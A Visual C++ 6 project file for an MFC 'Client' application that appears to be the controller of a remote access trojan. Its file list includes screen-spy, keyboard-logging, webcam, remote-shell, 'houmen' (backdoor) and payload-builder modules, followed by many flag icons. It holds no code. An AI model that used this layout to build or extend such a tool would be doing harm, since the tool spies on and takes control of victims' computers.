# Microsoft Developer Studio Project File - Name="Client" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=Client - Win32 Release
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "Client.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "Client.mak" CFG="Client - Win32 Release"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "Client - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe
# PROP BASE Use_MFC 6
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 5
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MD /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_AFXDLL" /Yu"stdafx.h" /FD /c
# ADD CPP /nologo /MT /w /W0 /GX /O1 /I "Include" /I "..\common" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /FD /Zm1000 /c
# SUBTRACT CPP /Fr /YX
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "NDEBUG" /d "_AFXDLL"
# ADD RSC /l 0x804 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 /nologo /subsystem:windows /machine:I386
# ADD LINK32 ..\common\libxvidcore.lib ..\common\va_g729a.lib vfw32.lib nafxcw.lib LIBCMT.lib /nologo /subsystem:windows /machine:I386 /out:"..\Bin\Client.exe"
# Begin Target

# Name "Client - Win32 Release"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=..\common\Audio.cpp
# End Source File
# Begin Source File

SOURCE=.\AudioDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\BmpToAvi.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\Buffer.cpp
# End Source File
# Begin Source File

SOURCE=.\BuildDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ChangeGroupDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ChromeDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Client.cpp
# End Source File
# Begin Source File

SOURCE=.\Client.rc
# End Source File
# Begin Source File

SOURCE=.\ClientDoc.cpp
# End Source File
# Begin Source File

SOURCE=.\ClientView.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\Dec.cpp
# End Source File
# Begin Source File

SOURCE=.\Dib.cpp
# End Source File
# Begin Source File

SOURCE=.\FileAttr.cpp
# End Source File
# Begin Source File

SOURCE=.\FileManagerDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\FileTransferModeDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\HackerTools.cpp
# End Source File
# Begin Source File

SOURCE=.\HtmlCtrl.cpp
# End Source File
# Begin Source File

SOURCE=.\Icons.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\IniFile.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\InputDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\IOCPServer.cpp
# End Source File
# Begin Source File

SOURCE=.\KeyBoardDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\LFileName.cpp
# End Source File
# Begin Source File

SOURCE=.\LocalUpload.cpp
# End Source File
# Begin Source File

SOURCE=.\LOGIN.cpp
# End Source File
# Begin Source File

SOURCE=.\LogView.cpp
# End Source File
# Begin Source File

SOURCE=.\MainFrm.cpp
# End Source File
# Begin Source File

SOURCE=.\MapDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\MD5.CPP
# End Source File
# Begin Source File

SOURCE=.\MsgBoxDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\MyChat.cpp
# End Source File
# Begin Source File

SOURCE=.\MyToolsKit.cpp
# End Source File
# Begin Source File

SOURCE=.\OpenProxy.cpp
# End Source File
# Begin Source File

SOURCE=.\PcView.cpp
# End Source File
# Begin Source File

SOURCE=.\PictureEx.cpp
# End Source File
# Begin Source File

SOURCE=.\Play.cpp
# End Source File
# Begin Source File

SOURCE=.\PrankDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ProxyMapDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\RegeditDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\RegeditTextDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ScreenSpyDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ScreenSpyDlgs.cpp
# End Source File
# Begin Source File

SOURCE=.\ServiceDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\ServiceInfoDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\SettingDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\SEU_QQwry.cpp
# End Source File
# Begin Source File

SOURCE=.\ShellDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\ShowWave.cpp
# End Source File
# Begin Source File

SOURCE=.\SortListCtrl.cpp
# End Source File
# Begin Source File

SOURCE=.\Include\SoundToWav.cpp
# End Source File
# Begin Source File

SOURCE=.\Start.cpp
# End Source File
# Begin Source File

SOURCE=.\StdAfx.cpp
# ADD CPP /Yc"stdafx.h"
# End Source File
# Begin Source File

SOURCE=.\SystemDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\TextChatDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\TrueColorToolBar.cpp
# End Source File
# Begin Source File

SOURCE=.\UACYXDlg.cpp
# End Source File
# Begin Source File

SOURCE=.\WebCamDlg.cpp
# End Source File
# Begin Source File

SOURCE=..\common\xvidsdk\XvidDec.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\AudioDlg.h
# End Source File
# Begin Source File

SOURCE=.\Include\BmpToAvi.h
# End Source File
# Begin Source File

SOURCE=.\Include\Buffer.h
# End Source File
# Begin Source File

SOURCE=.\BuildDlg.h
# End Source File
# Begin Source File

SOURCE=.\ChangeGroupDlg.h
# End Source File
# Begin Source File

SOURCE=.\ChromeDlg.h
# End Source File
# Begin Source File

SOURCE=.\Client.h
# End Source File
# Begin Source File

SOURCE=.\ClientDoc.h
# End Source File
# Begin Source File

SOURCE=.\ClientView.h
# End Source File
# Begin Source File

SOURCE=.\Include\Dec.h
# End Source File
# Begin Source File

SOURCE=.\Dib.h
# End Source File
# Begin Source File

SOURCE=.\FileAttr.h
# End Source File
# Begin Source File

SOURCE=.\FileManagerDlg.h
# End Source File
# Begin Source File

SOURCE=.\FileTransferModeDlg.h
# End Source File
# Begin Source File

SOURCE=.\HackerTools.h
# End Source File
# Begin Source File

SOURCE=.\houmen.h
# End Source File
# Begin Source File

SOURCE=.\HtmlCtrl.h
# End Source File
# Begin Source File

SOURCE=.\Icons.h
# End Source File
# Begin Source File

SOURCE=.\Include\IniFile.h
# End Source File
# Begin Source File

SOURCE=.\Include\InputDlg.h
# End Source File
# Begin Source File

SOURCE=.\Include\IOCPServer.h
# End Source File
# Begin Source File

SOURCE=.\KeyBoardDlg.h
# End Source File
# Begin Source File

SOURCE=.\LFileName.h
# End Source File
# Begin Source File

SOURCE=.\LocalUpload.h
# End Source File
# Begin Source File

SOURCE=.\LOGIN.h
# End Source File
# Begin Source File

SOURCE=.\LogView.h
# End Source File
# Begin Source File

SOURCE=..\common\macros.h
# End Source File
# Begin Source File

SOURCE=.\MainFrm.h
# End Source File
# Begin Source File

SOURCE=.\MapDlg.h
# End Source File
# Begin Source File

SOURCE=.\Include\Mapper.h
# End Source File
# Begin Source File

SOURCE=.\MD5.h
# End Source File
# Begin Source File

SOURCE=.\MsgBoxDlg.h
# End Source File
# Begin Source File

SOURCE=.\MyChat.h
# End Source File
# Begin Source File

SOURCE=.\MyToolsKit.h
# End Source File
# Begin Source File

SOURCE=.\OpenProxy.h
# End Source File
# Begin Source File

SOURCE=.\PcView.h
# End Source File
# Begin Source File

SOURCE=.\PictureEx.h
# End Source File
# Begin Source File

SOURCE=.\Play.h
# End Source File
# Begin Source File

SOURCE=.\PrankDlg.h
# End Source File
# Begin Source File

SOURCE=.\ProxyMapDlg.h
# End Source File
# Begin Source File

SOURCE=.\RegeditDlg.h
# End Source File
# Begin Source File

SOURCE=.\RegeditTextDlg.h
# End Source File
# Begin Source File

SOURCE=.\Resource.h
# End Source File
# Begin Source File

SOURCE=.\ScreenSpyDlg.h
# End Source File
# Begin Source File

SOURCE=.\ScreenSpyDlgs.h
# End Source File
# Begin Source File

SOURCE=.\ServiceDlg.h
# End Source File
# Begin Source File

SOURCE=.\ServiceInfoDlg.h
# End Source File
# Begin Source File

SOURCE=.\SettingDlg.h
# End Source File
# Begin Source File

SOURCE=.\Include\SEU_QQwry.h
# End Source File
# Begin Source File

SOURCE=.\ShellDlg.h
# End Source File
# Begin Source File

SOURCE=.\Include\showwave.h
# End Source File
# Begin Source File

SOURCE=.\SortListCtrl.h
# End Source File
# Begin Source File

SOURCE=.\Include\SoundToWav.h
# End Source File
# Begin Source File

SOURCE=.\Start.h
# End Source File
# Begin Source File

SOURCE=.\StdAfx.h
# End Source File
# Begin Source File

SOURCE=.\SystemDlg.h
# End Source File
# Begin Source File

SOURCE=.\TextChatDlg.h
# End Source File
# Begin Source File

SOURCE=.\TrueColorToolBar.h
# End Source File
# Begin Source File

SOURCE=.\UACYXDlg.h
# End Source File
# Begin Source File

SOURCE=.\WebCamDlg.h
# End Source File
# Begin Source File

SOURCE=..\common\xvidsdk\XvidDec.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# Begin Source File

SOURCE=.\res\0.bmp
# End Source File
# Begin Source File

SOURCE=.\res\1.bmp
# End Source File
# Begin Source File

SOURCE=.\res\1.cur
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\123.bmp
# End Source File
# Begin Source File

SOURCE=.\res\123.ico
# End Source File
# Begin Source File

SOURCE=.\res\2.bmp
# End Source File
# Begin Source File

SOURCE=.\res\2.cur
# End Source File
# Begin Source File

SOURCE=.\res\Reg\201.ico
# End Source File
# Begin Source File

SOURCE=.\res\RegIco\201.ico
# End Source File
# Begin Source File

SOURCE=.\res\Reg\202.ico
# End Source File
# Begin Source File

SOURCE=.\res\RegIco\202.ico
# End Source File
# Begin Source File

SOURCE=.\res\Reg\203.ico
# End Source File
# Begin Source File

SOURCE=.\res\RegIco\203.ico
# End Source File
# Begin Source File

SOURCE=.\res\Reg\204.ico
# End Source File
# Begin Source File

SOURCE=.\res\RegIco\204.ico
# End Source File
# Begin Source File

SOURCE=.\res\Reg\205.ico
# End Source File
# Begin Source File

SOURCE=.\res\RegIco\205.ico
# End Source File
# Begin Source File

SOURCE=.\res\Reg\206.ico
# End Source File
# Begin Source File

SOURCE=.\res\RegIco\206.ico
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\22.bmp
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\234.bmp
# End Source File
# Begin Source File

SOURCE=.\res\3.bmp
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\345.bmp
# End Source File
# Begin Source File

SOURCE=.\res\4.bmp
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\456.bmp
# End Source File
# Begin Source File

SOURCE=.\res\5.bmp
# End Source File
# Begin Source File

SOURCE=.\res\6.bmp
# End Source File
# Begin Source File

SOURCE=.\res\7.bmp
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\789.bmp
# End Source File
# Begin Source File

SOURCE=.\res\8.bmp
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\890.bmp
# End Source File
# Begin Source File

SOURCE=.\res\AppWindows.ico
# End Source File
# Begin Source File

SOURCE=.\res\Audio.ico
# End Source File
# Begin Source File

SOURCE=.\res\bitmap10.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap11.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap12.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap13.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap14.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap15.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap16.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap17.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap18.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap19.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap20.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap21.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap22.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap23.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap24.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap25.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap26.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap27.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap28.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap29.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap30.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap31.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap32.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap33.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap34.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap7.bmp
# End Source File
# Begin Source File

SOURCE=.\res\ClientBmp\bitmap7.bmp
# End Source File
# Begin Source File

SOURCE=.\res\bitmap8.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Bitmap_1.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Bitmap_2.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Bitmap_3.bmp
# End Source File
# Begin Source File

SOURCE=.\res\cam.ico
# End Source File
# Begin Source File

SOURCE=.\res\Client.ico
# End Source File
# Begin Source File

SOURCE=.\res\Client.rc2
# End Source File
# Begin Source File

SOURCE=.\res\ClientDoc.ico
# End Source File
# Begin Source File

SOURCE=.\res\Cmdshell.ico
# End Source File
# Begin Source File

SOURCE=.\res\dot.cur
# End Source File
# Begin Source File

SOURCE=.\res\File.ico
# End Source File
# Begin Source File

SOURCE=.\res\filetool.bmp
# End Source File
# Begin Source File

SOURCE=.\res\FileToolBarDisable.bmp
# End Source File
# Begin Source File

SOURCE=.\res\FileToolBarHot.bmp
# End Source File
# Begin Source File

SOURCE=.\res\GuoQiICO\gif1.bin
# End Source File
# Begin Source File

SOURCE=.\res\GuoQiICO\ico.ico
# End Source File
# Begin Source File

SOURCE=.\res\Wenj\icon209.ico
# End Source File
# Begin Source File

SOURCE=.\res\Wenj\Icon_C.ico
# End Source File
# Begin Source File

SOURCE=.\res\Wenj\Icon_D.ico
# End Source File
# Begin Source File

SOURCE=.\res\Wenj\Icon_E.ico
# End Source File
# Begin Source File

SOURCE=.\res\Wenj\Icon_F.ico
# End Source File
# Begin Source File

SOURCE=.\res\Wenj\Icon_G.ico
# End Source File
# Begin Source File

SOURCE=.\res\keyboard.ico
# End Source File
# Begin Source File

SOURCE=.\res\MenuBar.bmp
# End Source File
# Begin Source File

SOURCE=.\res\MFC.ico
# End Source File
# Begin Source File

SOURCE=.\res\nocam.ico
# End Source File
# Begin Source File

SOURCE=.\res\ooopic_1564112209.ico
# End Source File
# Begin Source File

SOURCE=.\res\ooopic_1564112456.ico
# End Source File
# Begin Source File

SOURCE=.\res\duolaameng\ooopic_1564211365.ico
# End Source File
# Begin Source File

SOURCE=.\res\duolaameng\ooopic_1564211419.ico
# End Source File
# Begin Source File

SOURCE=.\res\Process.ico
# End Source File
# Begin Source File

SOURCE=.\res\regedit.ico
# End Source File
# Begin Source File

SOURCE=.\res\ScreenSpy.ico
# End Source File
# Begin Source File

SOURCE=.\res\SearchToolBar.bmp
# End Source File
# Begin Source File

SOURCE=.\res\Service.ico
# End Source File
# Begin Source File

SOURCE=.\res\GuoQiICO\SVP7.gif
# End Source File
# Begin Source File

SOURCE=.\res\SVP7.gif
# End Source File
# Begin Source File

SOURCE=.\res\System.ico
# End Source File
# Begin Source File

SOURCE=.\res\TextChat.ico
# End Source File
# Begin Source File

SOURCE=.\res\toolbar.bmp
# End Source File
# Begin Source File

SOURCE=.\res\GuoQiICO\toolbar1.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar1.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar2.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar3.bmp
# End Source File
# Begin Source File

SOURCE=.\res\toolbar4.bmp
# End Source File
# Begin Source File

SOURCE=.\res\WebCam.ico
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\阿尔巴尼亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\阿尔及利亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\阿富汗.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\阿根廷.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\阿拉伯国家联盟.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\阿联酋.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\阿曼.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\阿塞拜疆.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\埃及.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\埃塞俄比亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\爱尔兰.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\爱沙尼亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\安道尔.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\安哥拉.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\安提瓜和巴布达.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\奥地利.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\澳大利亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\澳门.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\巴巴多斯.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\巴布亚新几内亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\巴哈马.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\巴基斯坦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\巴拉圭.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\巴勒斯坦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\巴林.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\巴拿马.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\巴西.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\白俄罗斯.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\保加利亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\北大西洋公约组织.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\贝宁.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\比利时.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\冰岛.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\玻利维亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\波多黎各.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\波兰.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\波斯尼亚和黑塞哥维那.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\博茨瓦纳.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\不丹.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\布基纳法索.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\布隆迪.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\朝鲜.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\赤道几内亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\丹麦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\德国.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\东帝汶.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\东南亚国家协会.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\独立国家国协.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\多哥.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\多米尼加.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\多米尼克.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\俄罗斯.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\厄瓜多尔.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\厄立特里亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\法国.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\菲律宾.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\芬兰.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\佛得角.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientBmp\服务生成.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\冈比亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\刚果(金).ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\刚果.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\哥伦比亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\哥斯达黎加.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\格林纳达.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\格鲁吉亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\古巴.ico"
# End Source File
# Begin Source File

SOURCE=".\res\ClientBmp\关于程序.bmp"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\圭亚那.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\国协.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\哈萨克斯坦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\海地.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\韩国.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\荷兰.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\洪都拉斯.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\基里巴斯.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\吉布提.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\吉尔吉斯斯坦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\几内亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\几内亚比绍.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\加勒比海共同体.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\加拿大.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\加纳.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\加蓬.ico"
# End Source File
# Begin Source File

SOURCE=".\res\LogIco\监听成功.ico"
# End Source File
# Begin Source File

SOURCE=".\res\LogIco\监听失败.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\柬埔寨.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\捷克.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\津巴布韦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\喀麦隆.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\卡塔尔.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\科摩罗.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\科特迪瓦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\科威特.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\克罗地亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\肯尼亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\拉脱维亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\莱索托.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\老挝.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\黎巴嫩.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\利比果亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\利比亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\立陶宛.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\联合国.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\列支敦士登.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\卢森堡.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\卢旺达.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\罗马尼亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\马达加斯加.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\马耳他.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\马尔代夫.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\马拉维.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\马来西亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\马里.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\马其顿.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\马绍尔群岛.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\毛里求斯.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\毛里塔尼亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\美国.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\美国国家组织.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\蒙古.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\孟加拉.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\秘鲁.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\密克罗尼西亚联邦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\缅甸.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\摩尔多瓦.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\摩洛哥.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\摩纳哥.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\莫桑比克.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\墨西哥.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\纳米比亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\南非.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\尼泊尔.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\尼加拉瓜.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\尼日尔.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\尼日利亚.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\挪威.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\欧洲联盟.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\帕劳.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\葡萄牙.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\日本.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\瑞典.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\瑞士.ico"
# End Source File
# Begin Source File

SOURCE=".\res\GuoQiICO\萨尔瓦多.ico"
# End Source File
